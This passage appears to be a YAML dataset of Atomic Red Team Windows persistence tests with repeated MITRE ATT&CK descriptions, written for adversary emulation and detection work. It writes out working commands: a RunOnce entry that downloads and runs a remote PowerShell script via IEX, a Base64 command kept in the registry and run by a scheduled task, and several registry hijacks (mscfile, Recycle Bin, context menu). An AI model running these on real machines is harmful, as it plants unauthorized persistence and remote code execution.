      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.'
    mitre_examples: []
    mitre_id: T1547.001
    mitre_mitigations: []
    mitre_name: Registry Run Keys / Startup Folder
    mitre_platforms: *id020
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/001
    - https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/
    - https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry
    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
    - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Reg Key RunOnce
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: eb44f842-0457-4ddc-9b92-c4caa144ac42
  cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force
    -ErrorAction Ignore

    '
  command: '$RunOnceKey = "#{reg_key_path}"

    set-itemproperty $RunOnceKey "NextRun" ''#{thing_to_execute} "IEX (New-Object
    Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"''

    '
  description: 'RunOnce Key Persistence via PowerShell

    Upon successful execution, a new entry will be added to the runonce item in the
    registry.

    '
  get_prereq_command: ''
  input_arguments:
    reg_key_path:
      default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
      description: Path to registry key to update
      type: path
    thing_to_execute:
      default: powershell.exe
      description: Thing to Run
      type: path
  mitre_info:
    mitre_data_sources: *id019
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may achieve persistence by adding a program to
      a startup folder or referencing it with a Registry run key. Adding an entry
      to the "run keys" in the Registry or startup folder will cause the program referenced
      to be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.'
    mitre_examples: []
    mitre_id: T1547.001
    mitre_mitigations: []
    mitre_name: Registry Run Keys / Startup Folder
    mitre_platforms: *id020
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/001
    - https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/
    - https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry
    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
    - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: PowerShell Registry RunOnce
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: bda6a3d6-7aa7-4e89-908b-306772e9662f
  cleanup_command: reg DELETE "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open"
    /f
  command: reg ADD "HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"
    /ve /d "calc.exe" /f
  description: 'Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)

    User have to clic on the recycle bin to lauch the payload (here calc)

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id019
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may achieve persistence by adding a program to
      a startup folder or referencing it with a Registry run key. Adding an entry
      to the "run keys" in the Registry or startup folder will cause the program referenced
      to be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.'
    mitre_examples: []
    mitre_id: T1547.001
    mitre_mitigations: []
    mitre_name: Registry Run Keys / Startup Folder
    mitre_platforms: *id020
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/001
    - https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/
    - https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry
    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
    - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Add persistance via Recycle bin
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: de47f4a0-2acb-416d-9a6b-cee584a4c4d1
  cleanup_command: reg delete "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify"
    /f
  command: reg add "HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command"
    /ve /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
  description: 'This atomic test add persistence taking advantage of the  Windows
    Context Menu [Hexacorn](https://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/)

    User have to right click on the main screen or in the white space of the opened
    folder (e.g. Size Modify).

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id019
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may achieve persistence by adding a program to
      a startup folder or referencing it with a Registry run key. Adding an entry
      to the "run keys" in the Registry or startup folder will cause the program referenced
      to be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.'
    mitre_examples: []
    mitre_id: T1547.001
    mitre_mitigations: []
    mitre_name: Registry Run Keys / Startup Folder
    mitre_platforms: *id020
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/001
    - https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/
    - https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry
    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
    - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Add persistence via Windows Context Menu
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: e895677d-4f06-49ab-91b6-ae3742d0a2ba
  cleanup_command: 'schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1

    reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1

    '
  command: 'reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE=
    /f

    schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe
    -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty
    -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}

    '
  description: "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1)\
    \ and then a scheduled task will be created.\nThe scheduled task will launch powershell\
    \ to decode and run the command in the registry daily.\nThis is a persistence\
    \ mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
  get_prereq_command: ''
  input_arguments:
    time:
      default: 07:45
      description: Daily scheduled task execution time
      type: string
  mitre_info:
    mitre_data_sources: &id021
    - 'Windows Registry: Windows Registry Key Creation'
    - 'File: File Modification'
    - 'File: File Creation'
    - 'Process: Process Creation'
    - 'Command: Command Execution'
    - 'Network Traffic: Network Traffic Flow'
    - 'Scheduled Job: Scheduled Job Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse the Windows Task Scheduler to perform
      task scheduling for initial or recurring execution of malicious code. There
      are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments) '
    mitre_examples: []
    mitre_id: T1053.005
    mitre_mitigations: []
    mitre_name: Scheduled Task
    mitre_platforms: &id022
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1053/005
    - https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
    - https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
    - https://x.com/leoloobeek/status/939248813465853953
    - https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events
    - https://technet.microsoft.com/library/dd315590.aspx
    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen
    - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml
    - https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder
    mitre_related_techniques: []
  name: Scheduled Task Executing Base64 Encoded Commands From Registry
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2
  cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
    /f

    schtasks /Delete /TN "#{task_name}" /F

    '
  command: 'reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
    /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f

    schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST
    /F

    ECHO Let''s open the Computer Management console now...

    compmgmt.msc

    '
  description: "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\n\
    When the Computer Management console is opened, it will run a malicious payload\
    \ (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry\
    \ modifications to hijack legitimate system processes.\n"
  get_prereq_command: ''
  input_arguments:
    payload:
      default: calc.exe
      description: Command you want the task to execute
      type: string
    task_name:
      default: CompMgmtBypass
      description: Name of the newly-created scheduled task
      type: string
  mitre_info:
    mitre_data_sources: *id021
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse the Windows Task Scheduler to perform
      task scheduling for initial or recurring execution of malicious code. There
      are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments) '
    mitre_examples: []
    mitre_id: T1053.005
    mitre_mitigations: []
    mitre_name: Scheduled Task
    mitre_platforms: *id022
    mitre_references:
    - https://attack.mitre.org/techniques/T1053/005
    - https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
    - https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
    - https://x.com/leoloobeek/status/939248813465853953
    - https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events
    - https://technet.microsoft.com/library/dd315590.aspx
    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen
    - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml
    - https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder
    mitre_related_techniques: []
  name: Scheduled Task Persistence via CompMgmt.msc
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 02124c37-767e-4b76-9383-c9fc366d9d4c
  cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
    /f

    schtasks /Delete /TN "#{task_name}" /F

    '
  command: 'reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"
    /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f

    schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST
    /F

    ECHO Let''s run the schedule task ...

    schtasks /Run /TN "EventViewerBypass"

    '
  description: "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\n\
    When the eventviewer console is opened, it will run a malicious payload (in this\
    \ case, `calc.exe`). \n"
  get_prereq_command: ''
  input_arguments:
    payload:
      default: calc.exe
      description: Command you want the task to execute
      type: string
    task_name:
      default: EventViewerBypass
      description: Name of the newly-created scheduled task
      type: string
  mitre_info:
    mitre_data_sources: *id021
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse the Windows Task Scheduler to perform
      task scheduling for initial or recurring execution of malicious code. There
      are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments) '
    mitre_examples: []
    mitre_id: T1053.005
    mitre_mitigations: []
    mitre_name: Scheduled Task
    mitre_platforms: *id022
    mitre_references:
    - https://attack.mitre.org/techniques/T1053/005
    - https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
    - https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments
    - https://x.com/leoloobeek/status/939248813465853953
    - https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/
    - https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events
    - https://technet.microsoft.com/library/dd315590.aspx
    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    - https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen
